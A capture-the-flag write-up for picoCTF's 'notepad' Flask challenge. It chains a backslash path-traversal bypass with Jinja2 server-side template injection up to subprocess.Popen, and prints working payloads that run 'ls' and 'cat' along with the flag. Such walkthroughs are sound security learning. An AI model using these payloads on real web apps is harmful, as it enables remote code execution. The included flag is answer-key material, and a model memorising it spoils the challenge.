It gives us the source code, only the app.py, try to understand it.
Firstly, it forbiddes "_" and "/" in note area.
but in the "name", it use url_fix, which will correct "\" to "/", so we can bypass it.
And it only use first 128 bytes plus a random string to be our URL, so we can use some garbage to make it more easy to read.
After all, we can do "Directory Traversal".
Then take a look on the error page in source code package.
It shows like this:
{% if error is not none %}
error: {{ error }}
{% include "errors/" + error + ".html" ignore missing %} {% endif %}
It'll include html which name is the value of error!
So we can create files in errors/ and call it in index.html by GET error.
Create our first payload. "..\templates\errors\" then submit.
I get the URL https://notepad.mars.picoctf.net/templates/errors/-dOGIqxrbxSc.html. It shows not found but it's not important.
Then back to the index.html and visit https://notepad.mars.picoctf.net/?error=-dOGIqxrbxSc, and it shows our payload~
This is a SSTI attack!
https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee Try this to know how to SSTI on Flask.
In short, ''.__class__ can access to the string's classes. but "_" is forbidden, so let's use the alternative:
request.args.get('class'), then we can assign the value to it by GET URL.
By the way, __mro__ can access to the "method resolution order", but the same, we change it to mro().(Print is the same)
So our payload will be(with garbage 128 bytes):
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{''[request.args.get('class')].mro()}}
After creating it(Not found is normal), we get the file's URL:
https://notepad.mars.picoctf.net/templates/errors/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-XGe75wjyzzQ.html(MINE)
So back and visit:
https://notepad.mars.picoctf.net/?error=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa-XGe75wjyzzQ&&class=__class__
(Don't forget class...)
It outputs:
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[<class 'str'>, <class 'object'>]
We take the 'object' class, so the index is 1.
Create next payload:
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{''[request.args.get('class')].mro()[1][request.args.get('subclasses')]()}}
we need it's __subclasses__
After the same process, we get the output:
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class 'weakproxy'>, <class 'int'>, <class 'bytearray'>, <class 'bytes'>, <class 'list'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'traceback'>, <class 'super'>, <class 'range'>, <class 'dict'>, <class 'dict_keys'>, <class 'dict_values'>, <class 'dict_items'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>,....................., <class 'zipfile._SharedFile'>, <class 'zipfile._Tellable'>, <class 'zipfile.ZipFile'>, <class 'zipfile.Path'>, <class 'pkgutil.ImpImporter'>, <class 'pkgutil.ImpLoader'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'platform._Processor'>, <class 'pyexpat.xmlparser'>, <class 'plistlib.UID'>, <class 'plistlib._PlistParser'>, <class 'plistlib._DumbXMLWriter'>, <class 'plistlib._BinaryPlistParser'>, <class 'plistlib._BinaryPlistWriter'>, ..................., <class 'flask.sessions.SessionInterface'>, <class 'werkzeug.wrappers.json._JSONModule'>, <class 'werkzeug.wrappers.json.JSONMixin'>, <class 'flask.blueprints.BlueprintSetupState'>, <class 'unicodedata.UCD'>, <class 'jinja2.ext.Extension'>, <class 'jinja2.ext._CommentFinder'>]
We need the "Popen" to execute our commands, and it's index is 273.
So next payload:
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{''[request.args.get('class')].mro()[1][request.args.get('subclasses')]()[273](['ls'],stdout=-1).communicate()}}
Output: ..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa(b'app.py\nflag-c8f5526c-4122-4578-96de-d7dd27193798.txt\nstatic\ntemplates\n', None)
Obviously, our flag is in flag-c8f5526c-4122-4578-96de-d7dd27193798.txt!
So use cat to read it and get the flag.
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa{{''[request.args.get('class')].mro()[1][request.args.get('subclasses')]()[273](['cat','flag-c8f5526c-4122-4578-96de-d7dd27193798.txt'],stdout=-1).communicate()}}
Output:
..\templates\errors\aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa(b'picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}\n', None)
picoCTF{styl1ng_susp1c10usly_s1m1l4r_t0_p4steb1n}